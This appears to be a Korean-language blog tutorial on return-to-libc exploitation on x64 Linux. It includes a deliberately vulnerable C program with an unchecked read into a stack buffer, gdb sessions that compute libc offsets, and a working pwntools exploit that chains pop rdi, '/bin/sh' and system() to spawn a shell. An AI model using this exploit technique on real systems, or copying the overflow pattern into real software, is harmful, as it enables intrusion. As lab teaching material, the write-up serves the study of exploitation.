---
title: Return-to-libc - x64
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-to-libc]
math: true
mermaid: true
---


## Calling Convention

"System V AMD64-ABI" 호출 규약을 사용한다.(Unix 계열)

- 레지스터 RDI, RSI, RDX, RCX, R8, R9 : 정수 메모리 주소 인수 전달
- 레지스터 XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6, XMM7 : 부동 소수점 인수 전달
- 레지스터 XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6, XMM7 : 부동 소수점 인수 전달
- Return Value Register : RAX

```c
// Test Code
// gcc -o test test.c
#include <stdlib.h>
#include <stdio.h>
 
void vuln(int a,int b,int c,int d){
        printf("%d, %d, %d, %d",a,b,c,d);
}
 
void main(){
        vuln(1,2,3,4);
}
```

`printf()` 함수의 첫 번째 인자는 "%d, %d, %d, %d"이다. 따라서 각 레지스터 값이 재배치 된다.

```
gdb-peda$ disassemble vuln
Dump of assembler code for function vuln:
0x0000000000400526 <+0>:   push   rbp
0x0000000000400527 <+1>:   mov    rbp,rsp
0x000000000040052a <+4>:   sub    rsp,0x10
0x000000000040052e <+8>:   mov    DWORD PTR [rbp-0x4],edi
0x0000000000400531 <+11>:  mov    DWORD PTR [rbp-0x8],esi
0x0000000000400534 <+14>:  mov    DWORD PTR [rbp-0xc],edx
0x0000000000400537 <+17>:  mov    DWORD PTR [rbp-0x10],ecx
0x000000000040053a <+20>:  mov    esi,DWORD PTR [rbp-0x10]
0x000000000040053d <+23>:  mov    ecx,DWORD PTR [rbp-0xc]
0x0000000000400540 <+26>:  mov    edx,DWORD PTR [rbp-0x8]
0x0000000000400543 <+29>:  mov    eax,DWORD PTR [rbp-0x4]
0x0000000000400546 <+32>:  mov    r8d,esi
0x0000000000400549 <+35>:  mov    esi,eax
0x000000000040054b <+37>:  mov    edi,0x400604
0x0000000000400550 <+42>:  mov    eax,0x0
0x0000000000400555 <+47>:  call   0x400400 <printf@plt>
0x000000000040055a <+52>:  nop
0x000000000040055b <+53>:  leave 
0x000000000040055c <+54>:  ret   
End of assembler dump.
gdb-peda$ i r
rax            0x40055d 0x40055d
rbx            0x0  0x0
rcx            0x4  0x4
rdx            0x3  0x3
rsi            0x2  0x2
rdi            0x1  0x1
rbp            0x7fffffffe460   0x7fffffffe460
rsp            0x7fffffffe460   0x7fffffffe460
```

## Proof of Concept

```c
// Vuln Code
// gcc -fno-stack-protector -o ret2libc ret2libc.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50] = "";
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}
```

bof를 통해 return address 변조를 할 수 있다. library address 실행 시마다 변경되므로 memory leak이 필요하다.

```
gdb-peda$ x/24gx $rbp
0x7ffcb2961950: 0x4141414141414141  0x4242424242424242
0x7ffcb2961960: 0x4343434343434343  0x00007ff7e780180a
```

**Memory map**

```
gdb-peda$ info proc map
process 44969
Mapped address spaces:
        Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /root/vulns/ret2libc/ret2libc
            0x600000           0x601000     0x1000        0x0 /root/vulns/ret2libc/ret2libc
            0x601000           0x602000     0x1000     0x1000 /root/vulns/ret2libc/ret2libc
        0x1a10000          0x1a31000    0x21000        0x0 [heap]
    0x7f0ecb598000     0x7f0ecb758000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f0ecb758000     0x7f0ecb958000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f0ecb958000     0x7f0ecb95c000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f0ecb95c000     0x7f0ecb95e000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7f0ecb95e000     0x7f0ecb962000     0x4000        0x0 
    0x7f0ecb962000     0x7f0ecb965000     0x3000        0x0 /lib/x86_64-linux-gnu/libdl-2.23.so
    0x7f0ecb965000     0x7f0ecbb64000   0x1ff000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so
    0x7f0ecbb64000     0x7f0ecbb65000     0x1000     0x2000 /lib/x86_64-linux-gnu/libdl-2.23.so
    0x7f0ecbb65000     0x7f0ecbb66000     0x1000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so
    0x7f0ecbb66000     0x7f0ecbb8c000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f0ecbd71000     0x7f0ecbd75000     0x4000        0x0 
    0x7f0ecbd8b000     0x7f0ecbd8c000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f0ecbd8c000     0x7f0ecbd8d000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
    0x7f0ecbd8d000     0x7f0ecbd8e000     0x1000        0x0 
    0x7ffc6fb39000     0x7ffc6fb5a000    0x21000        0x0 [stack]
    0x7ffc6fb98000     0x7ffc6fb9b000     0x3000        0x0 [vvar]
    0x7ffc6fb9b000     0x7ffc6fb9d000     0x2000        0x0 [vdso]
0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

libc offset을 계산한다.

```
gdb-peda$ p 0x7f0ecb5ed800(printf) - 0x7f0ecb598000(Library Base)
$8 = 0x55800
libBase = printf - 0x55800
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7f0ecb724d57 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ p 0x7f0ecb724d57-0x7f0ecb598000
$9 = 0x18cd57
&"/bin/sh" = libBase + 0x18cd57
gdb-peda$ p system
$10 = {<text variable, no debug info>} 0x7f0ecb5dd390 <__libc_system>
gdb-peda$ p 0x7f0ecb5dd390-0x7f0ecb598000
$11 = 0x45390
&system = libBase + 0x45390
```

## Exploit code

```python
# Exploit Code
from pwn import *

p=process('./ret2libc')

recv = p.recvline()
buf = int(recv.split(' ')[3],16)
libBase = buf - 0x55800
system = libBase + 0x45390
binsh = libBase + 0x18cd57
poprdi = 0x400763

print('buf     :' + hex(buf))
print('pop rdi :' + hex(poprdi))
print('/bin/sh :' + hex(binsh))
print('system  :' + hex(system))

exploit = "A"*72 + p64(poprdi) + p64(binsh) + p64(system)

p.send(exploit)

p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/vulns/ret2libc# python exploit.py 
[+] Starting local process './ret2libc': pid 44959
buf     :0x7fc0a582e800
pop rdi :0x400763
/bin/sh :0x7fc0a5965d57
system  :0x7fc0a581e390
[*] Switching to interactive mode
$ 
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Refereces
- [02.RTL(Return to Libc) - x64](https://www.lazenca.net/display/TEC/02.RTL%28Return+to+Libc%29+-+x64)